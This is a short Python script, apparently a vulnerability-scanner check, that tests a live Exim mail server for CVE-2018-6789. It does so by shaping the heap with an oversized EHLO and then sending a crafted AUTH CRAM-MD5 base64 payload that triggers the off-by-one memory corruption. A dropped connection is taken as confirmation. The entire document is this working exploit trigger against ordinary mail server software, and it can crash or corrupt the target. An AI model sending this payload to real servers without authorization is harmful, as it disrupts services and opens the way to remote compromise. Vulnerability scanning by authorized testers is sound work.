#已验证

import smtplib
from base64 import b64encode

def check(url, ip, port):
    print("Checking for CVE-2018-6789 vulnerability on Exim server...")
    
    try:
        s = smtplib.SMTP(ip, port)
        # Step 1: Put a huge chunk into unsorted bin
        s.ehlo("mmmm" + "b" * 0x1500)  # 0x2020

        # Step 2: Send base64 data and trigger off-by-one
        s.docmd("AUTH CRAM-MD5")

        payload = "d" * (0x2008 - 1)
        s.docmd(b64encode(payload.encode()).decode() + b64encode(b'\xf1\xf1').decode()[:-1])
        s.quit()
    except smtplib.SMTPServerDisconnected:
        return "[!] Exim server seems to be vulnerable to CVE-2018-6789."
    except Exception as e:
        print(f"Error: {e}")
        return "未验证"

    return None